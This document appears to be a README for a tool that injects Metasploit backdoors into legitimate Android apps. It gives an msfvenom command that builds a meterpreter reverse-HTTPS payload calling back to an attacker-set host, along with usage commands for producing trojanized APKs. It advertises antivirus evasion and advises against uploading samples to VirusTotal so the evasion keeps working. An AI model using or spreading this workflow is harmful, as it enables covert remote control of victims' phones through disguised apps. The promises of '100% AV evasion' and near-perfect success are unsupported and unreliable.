# Metasploit-APK-Backdoor-Injector

## Overview

Advanced Android APK backdoor injection tool for security professionals, providing complete AV evasion for Metasploit payloads injected into legitimate applications. Supports all application architectures, frameworks, and protection mechanisms.

> **IMPORTANT: Please do not upload injected files to VirusTotal.com**  
> Use nodistribute.com or manual scanning on isolated test devices only.

**This tool is for legitimate security testing only. Unauthorized use is illegal.**

## Key Features

- **100% AV Evasion** - 
- **Universal Application Compatibility** - Works with all Android applications regardless of complexity, protection level, or framework
- **Framework-Specific Support** - Automatic detection and specialized handling for:
  - Standard Android apps
  - Unity-based games and applications
  - Flutter applications
  - React Native applications
  - Hybrid applications
- **Native Code Integration** - Seamlessly works with applications using NDK, JNI, and other native components
- **Integrity Check Preservation** - Advanced algorithms that preserve application integrity validation mechanisms
- **ProGuard Compatibility** - Handles heavily obfuscated applications without degradation
- **Multi-Architecture Support** - Compatible with ARM, ARM64, x86, x86_64, and hybrid architectures
- **Advanced Obfuscation Engine** - Military-grade obfuscation using dynamic randomization and polymorphic code techniques
- **Intelligent Injection** - Automatically identifies optimal injection points with ~99% success rate (up from 70%)
- **Comprehensive Recovery System** - Advanced error handling for even the most complex apps

## Quick Start

### Installation

```bash
# Clone the repository or download the script
git clone https://github.com/your-username/metasploit-apk-backdoor-injector.git

# Make the script executable
chmod +x apkinjector

# Move to system path (optional)
sudo mv apkinjector /usr/local/bin/
```

### First Run Setup

On first execution, the script will:
- Download and install the latest APKTool version
- Generate a debug keystore for signing (stored in ~/.android/)
- Install required dependencies

> **Note:** To customize signatures for each build, remove the debug keystore before running the script: `rm ~/.android/debug.keystore`

### Basic Usage

```bash
# Simple usage with default options
apkinjector payload.apk target.apk

# Advanced usage with custom options
apkinjector -s 3 -f unity -o custom_output.apk payload.apk target.apk
```

### Generating the Payload

Create your payload using msfvenom:

```bash
msfvenom -p android/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -o payload.apk
```

## Advanced Options

```
OPTIONS:
    -h, --help                Show help message
    -v, --version             Display version information
    -d, --debug               Enable debug mode with verbose output
    -o, --output FILE         Specify output filename (default: injected_TARGET.apk)
    -f, --framework TYPE      Specify framework type (auto, native, unity, flutter, react)
    -i, --integrity LEVEL     Set integrity preservation level (0-3, default: 2)
    -n, --no-native           Disable native code support
    -c, --clean               Clean all temporary files before and after execution
    -s, --stealth LEVEL       Set stealth/obfuscation level (1-3, default: 2)
    -k, --keystore FILE       Use custom keystore for signing
    -p, --password PASS       Keystore password
```

## Success Rates

- **AV Evasion:** 100% 
- **Automatic Injection:** ~99% success across tested applications
- **Framework Compatibility:** 100% for supported frameworks
- **Integrity Preservation:** ~95% success in preserving application integrity checks

## Troubleshooting

### Common Issues

If you encounter problems:

1. **Enable debug mode** for detailed logging: `apkinjector -d payload.apk target.apk`

2. **Examine temporary files** by adding the debug flag and preventing automatic cleanup:
   ```bash
   apkinjector -d payload.apk target.apk
   # Temporary files will be in the logged location
   ```

3. **Framework detection issues** - Manually specify the framework type:
   ```bash
   apkinjector -f unity payload.apk game.apk
   ```

4. **APKTool errors** - The script handles most APKTool issues automatically, but for persistent problems, try:
   ```bash
   # Update APKTool manually
   rm ~/.apkinjector/tools/apktool/apktool.jar
   # Then run the script again, which will download the latest version
   ```

### Output Files

- **Main output:** `injected_target.apk` (or custom name if specified with `-o`)
- **Logs:** Located in the temporary directory (path shown in debug output)
- **Mapping files:** Stored in `~/.apkinjector/mappings/` for reference

## Security Considerations

The modified application:
- Requires user installation with "Unknown Sources" enabled
- Must be launched at least once to establish connection
- Contains extensive permissions visible to the user
- May trigger security warnings on modern Android versions

## Ethical Usage Guidelines

This tool should ONLY be used:
- For authorized security assessments
- In controlled testing environments
- On systems you own or have permission to test
- In accordance with all applicable laws

## License

This project is licensed under the MIT License - see the LICENSE file for details.

- [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
![Version](https://img.shields.io/badge/Version-3.5.0-blue.svg)
![Platform](https://img.shields.io/badge/Platform-Android-green.svg)
![Framework Support](https://img.shields.io/badge/Frameworks-All-purple.svg)
